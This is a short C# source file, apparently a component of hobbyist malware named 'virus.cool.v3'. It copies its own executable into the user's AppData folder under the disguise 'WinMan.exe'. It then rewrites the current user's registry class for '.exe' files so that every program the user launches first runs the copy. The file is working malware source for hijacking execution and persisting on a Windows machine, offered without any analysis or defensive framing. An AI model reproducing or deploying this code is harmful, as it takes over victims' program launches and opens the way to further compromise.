using System;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace ëntärtäïnër
{
    internal static class Hijack
    {
        private static readonly string HijackPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WinMan.exe");
        public const string AppName = "virus.cool.v3";
        private const string RegKey1 = @"HKEY_CURRENT_USER\Software\Classes\virus.cool.v3\shell\open\command";
        public const string RegKey2 = @"HKEY_CURRENT_USER\Software\Classes\.exe";

        public static void HijackExe()
        {
            File.Copy(Assembly.GetExecutingAssembly().Location, HijackPath);
            Registry.SetValue(RegKey2, null, AppName);
            Registry.SetValue(RegKey1, null, $"\"{HijackPath}\" start \"%0\" %*");
        }
    }
}